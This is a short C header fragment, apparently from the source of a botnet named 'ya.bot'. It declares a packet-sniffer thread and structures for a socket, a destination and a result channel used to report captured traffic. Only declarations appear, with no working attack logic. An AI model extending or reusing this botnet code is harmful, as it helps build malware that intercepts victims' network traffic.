/*  ya.bot  */

#ifndef NO_PSNIFF
DWORD WINAPI psniff_main(LPVOID param);

typedef struct SPacketList
{
	char *m_pszText;
	char *m_pszPacketType;
} SPacketList;

typedef struct SPacketSniffer
{
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	char m_szResultChannel[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SPacketSniffer;
#endif